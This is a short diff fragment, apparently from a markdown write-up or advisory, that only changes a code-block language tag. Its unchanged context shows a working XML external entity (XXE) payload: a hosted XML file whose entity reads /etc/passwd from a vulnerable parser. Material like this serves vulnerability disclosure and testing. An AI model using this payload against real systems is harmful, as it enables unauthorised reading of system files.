@@ -53,7 +53,7 @@ textarea {
 
 Host an XML file with the following contents:
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE cdl [<!ENTITY asd SYSTEM "file:///etc/passwd">]>
 <cdl>&asd;</cdl>
